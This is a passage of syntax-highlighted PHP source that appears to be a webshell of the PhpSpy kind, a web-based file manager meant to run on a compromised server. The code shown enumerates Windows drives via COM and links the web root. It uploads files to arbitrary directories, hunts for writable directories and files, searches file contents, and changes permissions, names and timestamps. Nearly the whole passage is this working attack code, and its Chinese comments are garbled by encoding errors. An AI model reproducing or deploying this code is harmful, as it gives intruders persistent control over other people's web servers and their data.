    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$n</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s1">&#39;&amp;lt;a href=&quot;javascript:godir(\&#39;&#39;</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="nv">$path</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$path</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&amp;lt;/a&amp;gt;&#39;</span><span class="p">;</span>
    <span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;</span>
<span class="x">document.onclick = shownav;</span>
<span class="x">function shownav(e){</span>
<span class="x">    var src = e?e.target:event.srcElement;</span>
<span class="x">    do{</span>
<span class="x">        if(src.id ==&quot;jumpto&quot;) {</span>
<span class="x">            $(&#39;inputnav&#39;).style.display = &quot;&quot;;</span>
<span class="x">            $(&#39;pathnav&#39;).style.display = &quot;none&quot;;</span>
<span class="x">            //hidenav();</span>
<span class="x">            return;</span>
<span class="x">        }</span>
<span class="x">        if(src.id ==&quot;inputnav&quot;) {</span>
<span class="x">            return;</span>
<span class="x">        }</span>
<span class="x">        src = src.parentNode;</span>
<span class="x">    }while(src.parentNode)</span>

<span class="x">    $(&#39;inputnav&#39;).style.display = &quot;none&quot;;</span>
<span class="x">    $(&#39;pathnav&#39;).style.display = &quot;&quot;;</span>
<span class="x">}</span>
<span class="x">&amp;lt;/script&amp;gt;</span>
<span class="x">&amp;lt;div style=&quot;background:#eee;margin-bottom:10px;&quot;&amp;gt;</span>
<span class="x">    &amp;lt;table id=&quot;pathnav&quot; width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;5&quot; cellspacing=&quot;0&quot;&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;</span>
<span class="x">            &amp;lt;td width=&quot;100%&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$cwd_links</span><span class="o">.</span><span class="s1">&#39; - &#39;</span><span class="o">.</span><span class="nx">getChmod</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; / &#39;</span><span class="o">.</span><span class="nx">getPerms</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">)</span><span class="o">.</span><span class="nx">getUser</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"> (</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dir_writeable</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">)&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td nowrap&amp;gt;&amp;lt;input class=&quot;bt&quot; id=&quot;jumpto&quot; name=&quot;jumpto&quot; value=&quot;Jump to&quot; type=&quot;button&quot;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="x">    &amp;lt;table id=&quot;inputnav&quot; width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;5&quot; cellspacing=&quot;0&quot; style=&quot;display:none;&quot;&amp;gt;</span>
<span class="x">    &amp;lt;form action=&quot;&quot; method=&quot;post&quot; id=&quot;godir&quot; name=&quot;godir&quot;&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;</span>
<span class="x">            &amp;lt;td nowrap&amp;gt;Current Directory (</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dir_writeable</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">, </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">getChmod</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x">)&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td width=&quot;100%&quot;&amp;gt;&amp;lt;input name=&quot;view_writable&quot; value=&quot;0&quot; type=&quot;hidden&quot; /&amp;gt;&amp;lt;input class=&quot;input&quot; name=&quot;dir&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$nowpath</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">&quot; type=&quot;text&quot; style=&quot;width:99%;margin:0 8px;&quot;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td nowrap&amp;gt;&amp;lt;input class=&quot;bt&quot; value=&quot;GO&quot; type=&quot;submit&quot;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_WIN</span> <span class="o">&amp;&amp;</span> <span class="nx">IS_COM</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">COM</span><span class="p">(</span><span class="s1">&#39;scripting.filesystemobject&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$obj</span> <span class="o">&amp;&amp;</span> <span class="nb">is_object</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$obj</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Drives</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=&quot;drives&quot;&amp;gt;&#39;</span><span class="p">;</span>
            <span class="nv">$DriveTypeDB</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;Unknow&#39;</span><span class="p">,</span><span class="mi">1</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;Removable&#39;</span><span class="p">,</span><span class="mi">2</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;Fixed&#39;</span><span class="p">,</span><span class="mi">3</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;Network&#39;</span><span class="p">,</span><span class="mi">4</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;CDRom&#39;</span><span class="p">,</span><span class="mi">5</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;RAM Disk&#39;</span><span class="p">);</span>
            <span class="nv">$comma</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="k">foreach</span><span class="p">(</span><span class="nv">$obj</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Drives</span> <span class="k">as</span> <span class="nv">$drive</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$drive</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Path</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">p</span><span class="p">(</span><span class="nv">$comma</span><span class="o">.</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:godir(\&#39;&#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Path</span><span class="o">.</span><span class="s1">&#39;/\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$DriveTypeDB</span><span class="p">[</span><span class="nv">$drive</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">DriveType</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;(&#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Path</span><span class="o">.</span><span class="s1">&#39;)&amp;lt;/a&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nv">$comma</span> <span class="o">=</span> <span class="s1">&#39;&amp;lt;span&amp;gt;|&amp;lt;/span&amp;gt;&#39;</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;/div&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="nv">$findstr</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;findstr&#39;</span><span class="p">];</span>
    <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;re&#39;</span><span class="p">];</span>
    <span class="nx">tbhead</span><span class="p">();</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;alt1&quot;&amp;gt;&amp;lt;td colspan=&quot;7&quot; style=&quot;padding:5px;line-height:20px;&quot;&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;form action=&quot;&#39;</span><span class="o">.</span><span class="nv">$self</span><span class="o">.</span><span class="s1">&#39;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;&amp;lt;div style=&quot;float:right;&quot;&amp;gt;&amp;lt;input class=&quot;input&quot; name=&quot;uploadfile&quot; value=&quot;&quot; type=&quot;file&quot; /&amp;gt; &amp;lt;input class=&quot;bt&quot; name=&quot;doupfile&quot; value=&quot;Upload&quot; type=&quot;submit&quot; /&amp;gt;&amp;lt;input name=&quot;uploaddir&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$nowpath</span><span class="o">.</span><span class="s1">&#39;&quot; type=&quot;hidden&quot; /&amp;gt;&amp;lt;input name=&quot;dir&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$nowpath</span><span class="o">.</span><span class="s1">&#39;&quot; type=&quot;hidden&quot; /&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:godir(\&#39;&#39;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;DOCUMENT_ROOT&quot;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;WebRoot&amp;lt;/a&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39; | &amp;lt;a href=&quot;javascript:godir(\&#39;.\&#39;);&quot;&amp;gt;ScriptPath&amp;lt;/a&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39; | &amp;lt;a href=&quot;javascript:godir(\&#39;&#39;</span><span class="o">.</span><span class="nv">$nowpath</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;View All&amp;lt;/a&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39; | View Writable ( &amp;lt;a href=&quot;javascript:godir(\&#39;&#39;</span><span class="o">.</span><span class="nv">$nowpath</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;dir\&#39;);&quot;&amp;gt;Directory&amp;lt;/a&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39; | &amp;lt;a href=&quot;javascript:godir(\&#39;&#39;</span><span class="o">.</span><span class="nv">$nowpath</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;file\&#39;);&quot;&amp;gt;File&amp;lt;/a&amp;gt; )&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39; | &amp;lt;a href=&quot;javascript:createdir();&quot;&amp;gt;Create Directory&amp;lt;/a&amp;gt; | &amp;lt;a href=&quot;javascript:createfile(\&#39;&#39;</span><span class="o">.</span><span class="nv">$nowpath</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Create File&amp;lt;/a&amp;gt;&#39;</span><span class="p">);</span>

    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;div style=&quot;padding:5px 0;&quot;&amp;gt;&amp;lt;form action=&quot;&#39;</span><span class="o">.</span><span class="nv">$self</span><span class="o">.</span><span class="s1">&#39;&quot; method=&quot;POST&quot;&amp;gt;Find string in files(current folder): &amp;lt;input class=&quot;input&quot; name=&quot;findstr&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$findstr</span><span class="o">.</span><span class="s1">&#39;&quot; type=&quot;text&quot; /&amp;gt; &amp;lt;input class=&quot;bt&quot; value=&quot;Find&quot; type=&quot;submit&quot; /&amp;gt; Type: &amp;lt;input class=&quot;input&quot; name=&quot;writabledb&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$writabledb</span><span class="o">.</span><span class="s1">&#39;&quot; type=&quot;text&quot; /&amp;gt;&amp;lt;input name=&quot;dir&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;&quot; type=&quot;hidden&quot; /&amp;gt; &amp;lt;input name=&quot;re&quot; value=&quot;1&quot; type=&quot;checkbox&quot; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$re</span> <span class="o">?</span> <span class="s1">&#39;checked&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; /&amp;gt; Regular expressions&amp;lt;/form&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>

    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;head&quot;&amp;gt;&amp;lt;td&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Filename&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;16%&quot;&amp;gt;Last modified&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;10%&quot;&amp;gt;Size&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;20%&quot;&amp;gt;Chmod / Perms&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;22%&quot;&amp;gt;Action&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>

    <span class="c1">//²é¿´ËùÓÐ¿ÉÐ´ÎÄ¼þºÍÄ¿Â¼</span>
    <span class="nv">$dirdata</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
    <span class="nv">$filedata</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$view_writable</span> <span class="o">==</span> <span class="s1">&#39;dir&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$dirdata</span> <span class="o">=</span> <span class="nx">GetWDirList</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">);</span>
        <span class="nv">$filedata</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$view_writable</span> <span class="o">==</span> <span class="s1">&#39;file&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$dirdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$filedata</span> <span class="o">=</span> <span class="nx">GetWFileList</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$findstr</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$dirdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$filedata</span> <span class="o">=</span> <span class="nx">GetSFileList</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">,</span> <span class="nv">$findstr</span><span class="p">,</span> <span class="nv">$re</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// Ä¿Â¼ÁÐ±í</span>
        <span class="c1">//scandir()Ð§ÂÊ¸ü¸ß</span>
        <span class="nv">$dirs</span><span class="o">=@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$file</span><span class="o">=@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$filepath</span><span class="o">=</span><span class="nv">$nowpath</span><span class="o">.</span><span class="nv">$file</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">)){</span>
                <span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
                <span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;mtime&#39;</span><span class="p">]</span><span class="o">=@</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">));</span>
                <span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;dirchmod&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getChmod</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
                <span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;dirperm&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getPerms</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
                <span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;fileowner&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getUser</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
                <span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;dirlink&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$nowpath</span><span class="p">;</span>
                <span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$filepath</span><span class="p">;</span>
                <span class="nv">$dirdata</span><span class="p">[]</span><span class="o">=</span><span class="nv">$dirdb</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>       
                <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
                <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">sizecount</span><span class="p">(</span><span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">));</span>
                <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;mtime&#39;</span><span class="p">]</span><span class="o">=@</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">));</span>
                <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;filechmod&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getChmod</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
                <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;fileperm&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getPerms</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
                <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;fileowner&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getUser</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
                <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;dirlink&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$nowpath</span><span class="p">;</span>
                <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$filepath</span><span class="p">;</span>
                <span class="nv">$filedata</span><span class="p">[]</span><span class="o">=</span><span class="nv">$filedb</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="c1">// while</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$dirdb</span><span class="p">);</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$filedb</span><span class="p">);</span>
        <span class="o">@</span><span class="nb">closedir</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="o">@</span><span class="nb">sort</span><span class="p">(</span><span class="nv">$dirdata</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">sort</span><span class="p">(</span><span class="nv">$filedata</span><span class="p">);</span>
    <span class="nv">$dir_i</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>

    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;form id=&quot;filelist&quot; name=&quot;filelist&quot; action=&quot;&#39;</span><span class="o">.</span><span class="nv">$self</span><span class="o">.</span><span class="s1">&#39;&quot; method=&quot;post&quot;&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;thefile&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;doing&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">);</span>

    <span class="k">foreach</span><span class="p">(</span><span class="nv">$dirdata</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$dirdb</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$getdir</span> <span class="o">&amp;&amp;</span> <span class="nv">$getdir</span> <span class="o">==</span> <span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">])</span> <span class="p">{</span>
                <span class="nv">$attachsize</span> <span class="o">=</span> <span class="nx">dirsize</span><span class="p">(</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]);</span>
                <span class="nv">$attachsize</span> <span class="o">=</span> <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$attachsize</span><span class="p">)</span> <span class="o">?</span> <span class="nx">sizecount</span><span class="p">(</span><span class="nv">$attachsize</span><span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;Unknown&#39;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$attachsize</span> <span class="o">=</span> <span class="s1">&#39;&amp;lt;a href=&quot;javascript:getsize(\&#39;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Stat&amp;lt;/a&amp;gt;&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$thisbg</span> <span class="o">=</span> <span class="nx">bg</span><span class="p">();</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;&quot; onmouseover=&quot;this.className=\&#39;focus\&#39;;&quot; onmouseout=&quot;this.className=\&#39;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;\&#39;;&quot;&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td width=&quot;2%&quot; nowrap&amp;gt;&amp;lt;input name=&quot;dl[]&quot; type=&quot;checkbox&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;javascript:godir(\&#39;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&amp;lt;a href=&quot;javascript:opfile(\&#39;newtime\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;dirlink&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;mtime&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$attachsize</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:fileperm(\&#39;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;dirchmod&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt; / &#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:fileperm(\&#39;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;dirperm&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;fileowner&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&amp;lt;a href=&quot;javascript:rename(\&#39;&#39;</span><span class="o">.</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Rename&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
